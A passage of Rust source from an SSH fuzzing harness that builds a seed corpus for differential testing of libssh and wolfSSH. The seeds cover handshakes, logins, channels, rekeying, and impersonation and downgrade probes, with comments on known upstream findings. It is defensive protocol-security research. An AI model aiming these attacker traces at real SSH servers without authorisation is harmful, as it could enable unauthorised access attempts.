use puffin::agent::{AgentDescriptor, AgentName};
use puffin::algebra::Term;
use puffin::term;
use puffin::trace::{InputAction, OutputAction, Step, Trace};

use crate::protocol::{
    AgentType, RawSshMessageFlight, SshDescriptorConfig, SshProtocolBehavior, SshProtocolTypes,
};
use crate::query::SshQueryMatcher;
use crate::ssh::fn_impl::*;
use crate::ssh::message::{
    CompressionAlgorithms, EncryptionAlgorithms, KexAlgorithms, MacAlgorithms, RawSshMessage,
    SignatureSchemes, SshBytes, SshMessage,
};

// ── Corpus ─────────────────────────────────────────────────────────────────

pub fn create_corpus(
    _put: &dyn puffin::put_registry::Factory<SshProtocolBehavior>,
) -> Vec<(Trace<SshProtocolTypes>, &'static str)> {
    // The corpus does not depend on the PUT; delegate to a factory-free builder so
    // the corpus-composition invariant (which seeds are in the 0-diff differential
    // corpus vs. which divergent probes must stay OUT) is unit-testable without a
    // built harness — see `mod tests::differential_corpus_composition_invariant`.
    build_corpus()
}

/// Factory-free corpus builder (see [`create_corpus`]). Under default features this
/// returns the DIFFERENTIAL (0-diff-required) corpus; `--features rich-corpus`
/// appends the single-PUT divergent seeds.
pub(crate) fn build_corpus() -> Vec<(Trace<SshProtocolTypes>, &'static str)> {
    let client = AgentName::first();
    let server = client.next();

    // Only seeds that complete a full handshake are kept (the legacy mutual /
    // pre-crypto stub seeds were pruned). The chacha20 *_full seeds complete on
    // libssh; the *_aesgcm seeds complete on BOTH libssh and wolfSSH.
    //
    // On this branch the cross-vendor differential corpus is restricted to the
    // seeds that complete IDENTICALLY on both libssh and wolfSSH (the AES-GCM
    // client seeds). The other seeds do not (chacha20/ctr are libssh-only;
    // server-attacker / channel / rekey / ext-info / two-party seeds diverge
    // cross-vendor), so they would become spurious objectives and starve the
    // differential corpus — they are commented out below but kept documented
    // (and their `seed_*` functions remain defined above) for single-PUT /
    // claims-oracle campaigns.
    //
    // The `rich-corpus` feature appends the divergent seeds (channel DATA, rekey,
    // ext-info, credential-confusion B/C) for single-PUT parser/crash campaigns;
    // see the cfg block after this vec.
    #[allow(unused_mut)]
    let mut corpus: Vec<(Trace<SshProtocolTypes>, &'static str)> = vec![
        // (
        //     seed_client_attacker_full(server),
        //     "seed_client_attacker_full",
        // ),
        // (
        //     seed_server_attacker_full(client),
        //     "seed_server_attacker_full",
        // ),
        // SERVER-attacker (the PUT is the CLIENT): the only seed that fuzzes the
        // libssh / wolfSSH CLIENT parsers differentially. Promoted once it became
        // genuinely 0-diff: the c2s decryption recipe compares each client's
        // encrypted stream (before, a client-PUT comparison was vacuous), and the
        // libssh client harness was aligned with wolfSSH_connect() (pinned
        // algorithms, fixed user, "none" probe, session channel + shell). Both
        // clients now emit the same 6-message c2s transcript; stable over repeated
        // runs. (The ChaCha20 `seed_server_attacker_full` above stays out: chacha
        // is not negotiated in the differential.)
        (
            seed_server_attacker_full_aesgcm(client),
            "seed_server_attacker_full_aesgcm",
        ),
        // The same, continued into the connection protocol: the attacker reads the
        // client's CHANNEL_OPEN from its decrypted c2s stream and answers on the
        // channel number each client chose (confirmation + shell reply). 0-diff;
        // both clients reach DONE.
        (
            seed_server_attacker_session_aesgcm(client),
            "seed_server_attacker_session_aesgcm",
        ),
        // The base session: password login, then a session channel and an exec
        // request. The request addresses the channel each server confirmed (libssh
        // 43, wolfSSH 0), read from its decrypted CHANNEL_OPEN_CONFIRMATION, so
        // both stacks process it (a hard-coded channel 0 is dropped by libssh; the
        // corpus used to cut these seeds before the channel for that reason).
        (
            seed_client_attacker_full_aesgcm(server),
            "seed_client_attacker_full_aesgcm",
        ),
        // LEGIT positive control for the password-CHANGE USERAUTH_REQUEST message
        // format (RFC 4252 §8; issue #1047 item 6). Both stacks parse and accept
        // the change-request identically (0-diff), so this both (a) proves the
        // `fn_password_change_auth_data` constructor reaches each stack's password
        // handler and (b) is the 0-diff baseline the differential campaign explores
        // FROM — a mutation that makes one stack handle the change-request
        // differently now surfaces against a known-good control.
        (
            seed_client_attacker_passwd_change(server),
            "seed_client_attacker_passwd_change",
        ),
        // TCP/IP forwarding (RFC 4254 §7): an authorized tcpip-forward global
        // request + direct-tcpip channel open, both ACCEPTED by both stacks (shared
        // ssh_creds_forward_authorized boundary; wolfSSH FwdCb + libssh
        // global-request/message callbacks). It is post-filter 0-diff BECAUSE the
        // one genuine wolfSSH deviation it exercises — the REQUEST_SUCCESS port echo
        // for a non-zero requested port — is now permanently shadowed
        // (is_fwd_reqsuccess_port_echo_diff, gated behind SHADOW_KNOWN_BUGS; filed
        // as wolfSSL/wolfssh#1246). Registering it here
        // gives the forwarding accept path real differential-campaign coverage while
        // the known, documented port-echo stays quiet. Any OTHER forwarding
        // divergence (accept-vs-reject, a second changed message, a non-port-echo
        // response_data delta) is NOT shadowed and surfaces as an objective.
        (
            seed_client_attacker_forwarding(server),
            "seed_client_attacker_forwarding",
        ),
        // Same handshake but with a synthesized KEXINIT whose algorithm lists are
        // mutable sub-terms — the entry point for negotiation / downgrade fuzzing.
        (
            seed_client_attacker_full_kexinit_synth(server),
            "seed_client_attacker_full_kexinit_synth",
        ),
        // Non-AEAD suite (aes256-ctr + hmac-sha2-256): drives the separate
        // cipher + separate-MAC code path, distinct from the AEAD seeds.
        // (
        //     seed_client_attacker_full_ctr(server),
        //     "seed_client_attacker_full_ctr",
        // ),
        // Publickey login as key A — the baseline for the entity-authentication
        // / impersonation oracle. Mutations that make the server authenticate a
        // different key are flagged as impersonation. The chacha20 variant is
        // libssh-only; the aesgcm variant completes on both libssh and wolfSSH.
        // (
        //     seed_client_attacker_pubkey(server),
        //     "seed_client_attacker_pubkey",
        // ),
        (
            seed_client_attacker_pubkey_aesgcm(server),
            "seed_client_attacker_pubkey_aesgcm",
        ),
        // Credential-confusion entry point, PROMOTED to the differential corpus.
        // Publickey login as authorized identity B (user "userb", key B): both
        // stacks emit USERAUTH_SUCCESS and the trace is 0-diff. From here the DY
        // mutator explores the credential space under differential comparison —
        // swapping the username / pubkey blob / signature across identities A/B/C
        // — so a mutation that makes one stack AUTHENTICATE a pairing the other
        // rejects surfaces as a real accept/reject (UserAuthSuccess vs Failure)
        // divergence. The explicit *rejection* seeds (impersonate / unauthorized
        // C) stay single-PUT only: both stacks correctly reject, but they flush
        // USERAUTH_FAILURE at different s2c counter positions, so the decryption
        // recipe aligns on one side only — the same flush-timing wall documented
        // for the channel-number query. Not a bug; just not positionally clean.
        (
            seed_client_attacker_pubkey_b(server),
            "seed_client_attacker_pubkey_b",
        ),
        // Session layer: authenticated channel with full connection-protocol
        // traffic (window-adjust / data / extended-data / eof / close). PROMOTED:
        // 0-diff cross-vendor. Both stacks now decode the WHOLE channel flow
        // (setup CHANNEL_OPEN_CONFIRMATION through teardown WINDOW_ADJUST / EOF /
        // CLOSE). Two harness/comparison pieces made this possible: (1) the libssh
        // harness now drives channel data/eof/close callbacks symmetrically with
        // wolfSSH's worker (it consumes data -> WINDOW_ADJUST, answers EOF/CLOSE);
        // (2) the seed re-addresses channel traffic to each stack's actual channel
        // number, read from its decrypted CHANNEL_OPEN_CONFIRMATION (libssh 43 vs
        // wolfSSH 0), resolved per-PUT (fn_s2c_confirmation_sender_channel) — a
        // hard-coded recipient_channel=0 would be silently dropped by libssh. The
        // sole residual — WINDOW_ADJUST bytes_to_add (window-credit policy differs
        // per stack) — is #[comparable_ignore]'d as benign flow-control.
        (
            seed_client_attacker_channel_data(server),
            "seed_client_attacker_channel_data",
        ),
        // Client-initiated rekey (RFC 4253 §9), mutable rekey KEXINIT. PROMOTED:
        // 0-diff cross-vendor now that uniformise + semantic alignment + flight
        // decryption are in place (the earlier "diverges" note was stale).
        (
            seed_client_attacker_rekey(server),
            "seed_client_attacker_rekey",
        ),
        // RFC 8308 ext-info parser. PROMOTED: 0-diff cross-vendor.
        (
            seed_client_attacker_ext_info(server),
            "seed_client_attacker_ext_info",
        ),
        // Session requests: channel open / exec / unknown global
        // request / EOF / CLOSE, each answered by its own s2c flight, the later
        // ones addressed to the channel read back from the first reply. 0-diff
        // cross-vendor (stable over repeated runs) once the libssh harness's
        // global-request callback replied like libssh's own default. Its
        // `fn_u32_auto` counters let mutations drop / reorder whole round-trips.
        (
            seed_client_attacker_session_requests(server),
            "seed_client_attacker_session_requests",
        ),
        // COMPLETED rekey: the new keys are derived from the server's own rekey
        // KEXINIT / KEX_ECDH_REPLY (decrypted from its s2c stream), then traffic is
        // sent under them. 0-diff cross-vendor; both stacks answer in the new epoch.
        (
            seed_client_attacker_rekey_complete(server),
            "seed_client_attacker_rekey_complete",
        ),
        // Publickey query-then-sign: signs for the key blob the server echoed in its
        // USERAUTH_PK_OK (decrypted from its s2c stream). 0-diff cross-vendor.
        (
            seed_client_attacker_pubkey_query(server),
            "seed_client_attacker_pubkey_query",
        ),
        // Flow control from the server's own limits: one CHANNEL_DATA of exactly
        // min(window, max packet) from its decrypted confirmation. 0-diff.
        (
            seed_client_attacker_flow_control(server),
            "seed_client_attacker_flow_control",
        ),
        // Credential-confusion REJECTION seeds (impersonation: A-name-with-key-B;
        // and unauthorized key C). PROMOTED: 0-diff cross-vendor. Both stacks
        // correctly reject the same (user, key) pairing, and — now that the
        // post-KEX claim exposes the session id (H) even when auth is rejected —
        // both decode the encrypted SERVICE_ACCEPT + USERAUTH_FAILURE, which the
        // key-aligned transcript compares position-independently. (The earlier
        // "flush-timing wall, single-PUT only" note is stale: the wall was a
        // positional-alignment artifact the AlignedTranscript removes, and the
        // no-decryption-on-failed-auth gap is closed by the post-KEX claim.)
        // The DY mutator explores the credential space from here: a mutation that
        // makes one stack ACCEPT a pairing the other rejects surfaces as an
        // accept/reject (UserAuthSuccess vs Failure) divergence.
        (
            seed_client_attacker_impersonate_a_with_b(server),
            "seed_client_attacker_impersonate_a_with_b",
        ),
        (
            seed_client_attacker_unauthorized_key_c(server),
            "seed_client_attacker_unauthorized_key_c",
        ),
        // Two real PUTs relayed by the attacker — the substrate the live
        // matching-conversation oracle needs. Mutations that desync the relayed
        // transcript (Terrapin-style) are flagged as a security objective.
        // (
        //     seed_handshake_two_party(client, server),
        //     "seed_handshake_two_party",
        // ),
        // (The packet-granular honest relay `seed_handshake_two_party_packet_complete`
        // — the Terrapin substrate — is registered under rich-corpus below.)
    ];

    // Richer, cross-vendor-DIVERGING seeds for single-PUT parser/crash campaigns.
    // Kept out of the differential corpus (they don't complete identically on both
    // stacks) but invaluable for exercising post-auth channel data, re-KEX, ext-
    // info, and the credential-confusion boundary on one stack at a time.
    #[cfg(feature = "rich-corpus")]
    {
        corpus.extend([
            // (channel_data was PROMOTED to the differential corpus above, now that
            // the libssh harness drives channel data/eof/close symmetrically and
            // the seed re-addresses channel traffic per-PUT. The credential-
            // confusion REJECTION seeds impersonate_a_with_b / unauthorized_key_c
            // were likewise promoted, once the post-KEX claim let their encrypted
            // USERAUTH_FAILURE decode on both stacks. None are registered here now.)
            // Peer-initiated-rekey conformance probe: inject a valid KEXINIT after
            // NewKeys, then non-KEX traffic. Single-PUT (drives each stack's rekey
            // state machine); the confirmed-correct behaviour was validated with a
            // fresh-build TCP reproducer outside the fuzzer.
            // DELIBERATELY kept out of the differential corpus: it diverges BY
            // DESIGN on the strict-kex / rekey-discipline difference (libssh
            // withholds userauth while the injected rekey is pending; wolfSSH
            // proceeds) — a NIL-impact conformance difference, fixed upstream in
            // wolfSSL/wolfssh#1200 (wolfSSH's lack of the Terrapin-affected
            // ciphers neutralises any exploitability). Including it differentially
            // would just re-report this closed finding on every run; legitimate
            // (0-diff) rekey coverage is already provided by the `rekey` seed.
            (
                seed_client_attacker_kexinit_injection(server),
                "seed_client_attacker_kexinit_injection",
            ),
            // Auto-counter §7.1 discovery seed: honest 0-diff channel session with
            // `fn_u32_auto` c2s counters + a trailing rekey KEXINIT. A single
            // adjacent SwapMutator move strands app traffic after the incomplete
            // rekey (§7.1), and `preprocess_trace` renumbers the shifted packets so
            // their GCM nonces stay valid — the mechanism that makes §7.1
            // fuzz-discoverable rather than only hand-reproducible. See the seed
            // docstring.
            (
                seed_client_attacker_rekey_channel_auto(server),
                "seed_client_attacker_rekey_channel_auto",
            ),
            // LEGIT (Tier-1) §7.1 auto-discovery seed: honest 0-diff rekey with NO
            // app traffic near the window — the mutator must introduce non-KEX
            // traffic into the incomplete-rekey window on its own (harder, more
            // autonomous). See the seed docstring.
            (
                seed_client_attacker_rekey_auto(server),
                "seed_client_attacker_rekey_auto",
            ),
            // Honest two-party relay (a real client PUT against a real server PUT,
            // packet-granular): both peers complete on libssh and wolfSSH, and it
            // is even 0-diff cross-vendor, but only its cleartext prefix + claims
            // can be compared (the relaying attacker cannot decrypt), and a
            // divergence would mix client- and server-side behaviour of four
            // implementations. So single-PUT: it lets the mutator corrupt / drop /
            // reorder messages BETWEEN two real stacks (the Terrapin neighbourhood
            // is two mutations away; see the seed docstring).
            (
                seed_handshake_two_party_packet_complete(client, server),
                "seed_handshake_two_party_packet_complete",
            ),
            // NOTE: the DIVERGING RFC-conformance PROBE seeds are DELIBERATELY NOT
            // registered here — they diverge BY DESIGN and are kept only as
            // callable, documented reproducers / regression fixtures (see
            // wolfSSL/wolfssh#1047):
            //   * bad_service     — USERAUTH_REQUEST service != "ssh-connection" (wolfSSH accepts,
            //     libssh rejects; fixed upstream in wolfSSH 0068d52e).
            //   * unknown_msg      — pre-auth unknown/high-numbered message (item 7: libssh
            //     tolerates→Success, wolfSSH "message not allowed before user authentication").
            //   * dh_bad_exponent  — modular-DH KEXDH_INIT with e=0 (item 1: 0-diff, BOTH reject
            //     the out-of-range exponent). It is 0-diff but kept OUT of the differential corpus
            //     because it is a REJECT-path edge case, not a legit handshake; a legit group14
            //     positive control needs modular-DH math in the mapper (deferred).
            // (The item-6 password-change probe was PROMOTED to the differential corpus above as a
            // legit 0-diff positive control — it is the one new surface with honest legit
            // coverage.) Honest 0-diff corpus coverage of the auth/handshake paths is
            // already provided by `seed_client_attacker_pubkey_aesgcm` /
            // `_full_aesgcm`, from which each is a single-message mutation.
            // Registering a divergent reproducer as a seed would only re-surface a
            // closed, documented finding on every run. (The SERVER-attacker seed
            // `seed_server_attacker_full_aesgcm`, which fuzzes the CLIENT-side
            // parsers, used to be registered here as single-PUT only; it is now in
            // the DEFAULT differential corpus above — so it is NOT repeated here,
            // which would double-register it under rich-corpus.)
        ]);
    }

    corpus
}

// ── Seed: client attacker with full handshake and encrypted post-NewKeys ──────
//
// The fuzzer acts as the SSH client; the server is a real libssh instance.
// We compute the exchange hash using the actual server ephemeral ECDH key and
// derive the encryption key so we can send properly encrypted post-NewKeys
// messages (ServiceRequest, UserAuthRequest, ChannelOpen, ChannelRequest).

pub fn seed_client_attacker_full(server: AgentName) -> Trace<SshProtocolTypes> {
    // Knowledge available after OutputAction + sending banner/kexinit/EcdhInit:
    //   (server, 0)[None]/RawSshMessage → server banner
    //   (server, 0)[None]/SshMessage    → server KexInit
    //   (server, 1)[None]/SshMessage    → server KexEcdhReply

    let server_banner_raw = term! { (server, 0)[None]/RawSshMessage };
    let server_banner_id = term! { fn_banner_id((@server_banner_raw)) };

    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    // Use RawSshMessage for K_S extraction (SshMessage lossy-parses RSA keys).
    // RawSshMessage indices: 0=Banner, 1=KexInit, 2=KexEcdhReply, 3=NewKeys
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };

    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };

    let shared = term! {
        fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub))
    };

    // Our kexinit mirrors server's algorithms.
    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };

    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };

    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id),
            (@server_banner_id),
            (@i_c),
            (@i_s),
            (@server_hostkey),
            (fn_client_ecdh_pubkey),
            (@server_ecdh_pub),
            (@shared)
        )
    };

    let enc_key = term! {
        fn_derive_enc_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash))))
    };

    // Sequence numbers: banner is NOT a binary packet.
    // Binary packets we send: KexInit(0), KexEcdhInit(1), NewKeys(2)
    // First encrypted packets: ServiceRequest(3), AuthRequest(4),
    //   ChannelOpen(5), ChannelRequest(6)
    let svc_req = term! {
        fn_encrypt_packet(
            (fn_service_request((fn_ssh_userauth))),
            (@enc_key),
            (fn_u32_3)
        )
    };
    let auth_req = term! {
        fn_encrypt_packet(
            (fn_user_auth_request(
                (fn_username),
                (fn_ssh_connection),
                (fn_method_password),
                (fn_password_auth_data((fn_password)))
            )),
            (@enc_key),
            (fn_u32_4)
        )
    };
    let chan_open = term! {
        fn_encrypt_packet(
            (fn_channel_open(
                (fn_channel_session),
                (fn_channel_id_0),
                (fn_u32_1),
                (fn_u32_2),
                (fn_empty_bytes_vec)
            )),
            (@enc_key),
            (fn_u32_5)
        )
    };
    let chan_req = term! {
        fn_encrypt_packet(
            (fn_channel_request(
                (fn_u32_0),
                (fn_channel_exec),
                (fn_true),
                (fn_exec_payload((fn_exec_command_userauth)))
            )),
            (@enc_key),
            (fn_u32_6)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
            InputAction::new_step(server, term! { @chan_open }),
            InputAction::new_step(server, term! { @chan_req }),
        ],
        ..Default::default()
    }
}

// ── Seed: client attacker authenticating with PUBLIC KEY (identity A) ─────────
//
// Same handshake as seed_client_attacker_full, but instead of password auth the
// fuzzer logs in with publickey method, signing the RFC 4252 §7 blob with client
// identity key A (the only client key whose private half is in the signature).
// This is the honest baseline for the entity-authentication / impersonation
// oracle: it completes as A; any mutation that makes the server authenticate a
// *different* key is flagged as impersonation.
pub fn seed_client_attacker_pubkey(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_raw = term! { (server, 0)[None]/RawSshMessage };
    let server_banner_id = term! { fn_banner_id((@server_banner_raw)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! {
        fn_kex_init(
            (fn_placeholder_16bytes),
            ((server, 0)[None]/KexAlgorithms),
            ((server, 0)[None]/SignatureSchemes),
            ((server, 0)[None]/EncryptionAlgorithms),
            ((server, 1)[None]/EncryptionAlgorithms),
            ((server, 0)[None]/MacAlgorithms),
            ((server, 1)[None]/MacAlgorithms),
            ((server, 0)[None]/CompressionAlgorithms),
            ((server, 1)[None]/CompressionAlgorithms)
        )
    };
    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let enc_key = term! { fn_derive_enc_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    let svc_req = term! {
        fn_encrypt_packet((fn_service_request((fn_ssh_userauth))), (@enc_key), (fn_u32_3))
    };

    // Publickey auth: sign the §7 blob (over the session id = exchange hash) with
    // key A, then carry A's blob + the signature in the request.
    let sig = term! {
        fn_sign_userauth((fn_session_id_from_hash((@exch_hash))), (fn_username), (fn_ssh_connection), (fn_client_a_pubkey_blob))
    };
    let auth_req = term! {
        fn_encrypt_packet(
            (fn_user_auth_request(
                (fn_username),
                (fn_ssh_connection),
                (fn_method_publickey),
                (fn_publickey_auth_data((fn_client_a_pubkey_blob), (@sig)))
            )),
            (@enc_key),
            (fn_u32_4)
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            InputAction::new_step(server, term! { @auth_req }),
        ],
        ..Default::default()
    }
}

// ── Seed: client attacker full handshake over AES-256-GCM ─────────────────────
//
// Same shape as seed_client_attacker_full but forces aes256-gcm@openssh.com
// (offered by BOTH libssh and wolfSSH), so this single seed completes the full
// handshake + encrypted record layer against both implementations. The fuzzer
// is the client; the libssh/wolfSSH server is the PUT.
pub fn seed_client_attacker_full_aesgcm(server: AgentName) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    // Fixed client KexInit offering only aes256-gcm.
    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };

    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (fn_puffin_id), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    // c2s AES-256-GCM key + IV.
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    // AES-GCM invocation counter = per-direction packet index since NewKeys (0,1,2,3).
    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request((fn_username), (fn_ssh_connection), (fn_method_password),
                                  (fn_password_auth_data((fn_password))))),
            (@key), (@iv), (fn_u32_auto))
    };
    let chan_open = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_open((fn_channel_session), (fn_channel_id_0), (fn_window_size_default), (fn_max_packet_size_default),
                             (fn_empty_bytes_vec))),
            (@key), (@iv), (fn_u32_auto))
    };
    // The channel the server confirmed (its sender_channel), read from its decrypted
    // CHANNEL_OPEN_CONFIRMATION: the CHANNEL_REQUEST addresses it (RFC 4254 §5.1).
    let key_s2c = term! { fn_derive_aes_key_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv_s2c = term! { fn_derive_iv_s2c((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let chan = term! { fn_s2c_confirmation_sender_channel(((server, *)/RawSshMessageFlight), (@key_s2c), (@iv_s2c)) };
    let chan_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_channel_request((@chan), (fn_channel_exec), (fn_true),
                                (fn_exec_payload((fn_exec_command_userauth))))),
            (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner(fn_puffin_banner) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
            InputAction::new_step(server, term! { @svc_req }),
            OutputAction::new_step(server), // SERVICE_ACCEPT
            InputAction::new_step(server, term! { @auth_req }),
            OutputAction::new_step(server), // USERAUTH_SUCCESS / FAILURE
            InputAction::new_step(server, term! { @chan_open }),
            OutputAction::new_step(server), // CHANNEL_OPEN_CONFIRMATION
            InputAction::new_step(server, term! { @chan_req }),
            OutputAction::new_step(server), // CHANNEL_SUCCESS
        ],
        ..Default::default()
    }
}

/// Banner/version probe builder, written after the campaigns surfaced the banner
/// divergence class (libssh "too large banner" vs wolfSSH carrying on), to test two
/// hypotheses: H2, does each stack accept an over-long identification line; H3, do they
/// treat a control byte inside it the same way. A completing
/// AES-256-GCM client-attacker handshake (mirrors `seed_client_attacker_full_aesgcm`,
/// truncated at USERAUTH_REQUEST) whose WIRE banner and H-input V_C are both
/// replaced by a caller-supplied out-of-spec pair. Because puffin reconstructs H
/// from `vc`, a PUT completes to USERAUTH_{SUCCESS,FAILURE} IFF it binds exactly
/// that RFC 4253 §8-canonical V_C; if instead it rejects the banner (or normalizes
/// it to something else) the c2s AEAD keys diverge and it never reaches auth. A
/// cross-PUT accept/reject asymmetry is therefore a real RFC 4253 §4.2 banner
/// conformance divergence (H2); a split on the whitespace/control variants is a
/// normalization divergence (H3 — transcript-injection viable). Not registered in
/// any corpus (diverges by design; callable reproducer only).
#[allow(dead_code)]
fn banner_probe_seed(
    server: AgentName,
    banner_wire: Term<SshProtocolTypes>,
    vc: Term<SshProtocolTypes>,
) -> Trace<SshProtocolTypes> {
    let server_banner_id =
        term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
    let server_kexinit = term! { (server, 0)[None]/SshMessage };
    let server_ecdh_reply_msg = term! { (server, 1)[None]/SshMessage };
    let server_ecdh_reply_raw =
        term! { (server, 0)[Some(SshQueryMatcher::MsgType(31))]/RawSshMessage };
    let server_ecdh_pub = term! { fn_server_ecdh_pubkey((@server_ecdh_reply_msg)) };
    let server_hostkey = term! { fn_server_hostkey_raw((@server_ecdh_reply_raw)) };
    let shared = term! { fn_ecdh_shared_secret((fn_client_ecdh_privkey), (@server_ecdh_pub)) };

    let our_kexinit = term! { fn_client_kexinit_aesgcm((fn_placeholder_16bytes)) };

    let i_c = term! { fn_kexinit_payload((@our_kexinit)) };
    let i_s = term! { fn_kexinit_payload((@server_kexinit)) };
    // H reconstructed from the caller's canonical V_C (not fn_puffin_id).
    let exch_hash = term! {
        fn_kex_exchange_hash(
            (@vc), (@server_banner_id), (@i_c), (@i_s),
            (@server_hostkey), (fn_client_ecdh_pubkey), (@server_ecdh_pub), (@shared)
        )
    };
    let key = term! { fn_derive_aes_key_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };
    let iv = term! { fn_derive_iv_c2s((@shared), (@exch_hash), (fn_session_id_from_hash((@exch_hash)))) };

    let svc_req = term! {
        fn_encrypt_packet_aesgcm((fn_service_request((fn_ssh_userauth))), (@key), (@iv), (fn_u32_auto))
    };
    let auth_req = term! {
        fn_encrypt_packet_aesgcm(
            (fn_user_auth_request((fn_username), (fn_ssh_connection), (fn_method_password),
                                  (fn_password_auth_data((fn_password))))),
            (@key), (@iv), (fn_u32_auto))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor::from_config(
            server,
            SshDescriptorConfig {
                typ: AgentType::Server,
                try_reuse: false,
                ..Default::default()
            },
        )],
        steps: vec![
            OutputAction::new_step(server),
            InputAction::new_step(server, term! { fn_banner((@banner_wire)) }),
            OutputAction::new_step(server), // KEXINIT
            InputAction::new_step(server, term! { fn_packet((@our_kexinit)) }),
            InputAction::new_step(
                server,
                term! { fn_packet((fn_kex_ecdh_init((fn_client_ecdh_pubkey)))) },
            ),
            OutputAction::new_step(server), // KEX_ECDH_REPLY, NEWKEYS
            InputAction::new_step(server, term! { fn_packet((fn_new_keys)) }),
